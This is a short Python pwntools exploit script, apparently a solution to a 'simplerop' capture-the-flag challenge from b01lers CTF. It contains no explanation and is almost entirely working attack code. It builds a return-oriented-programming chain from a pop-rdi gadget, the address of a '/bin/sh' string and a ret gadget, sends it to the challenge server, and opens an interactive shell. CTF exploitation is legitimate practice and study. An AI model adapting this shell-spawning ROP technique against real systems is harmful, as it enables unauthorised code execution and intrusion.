#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Addr
binsh = 0x402008

#Gadget
L_pop_rdi = 0x00401273
L_ret = 0x00401150

#Exploit
if __name__ == '__main__':
	io = process('./simplerop-af22071fcb7a6df9175940946a6d45e5')
	io = remote('chal.ctf.b01lers.com',1008)
	L_ROP = b'A'*0x8+\
		p64(L_pop_rdi)+\
		p64(binsh)+\
		p64(L_ret)+\
		p64(0x401080)
	pause()
	io.sendafter('see it for yourself.\n',L_ROP)
	io.interactive()
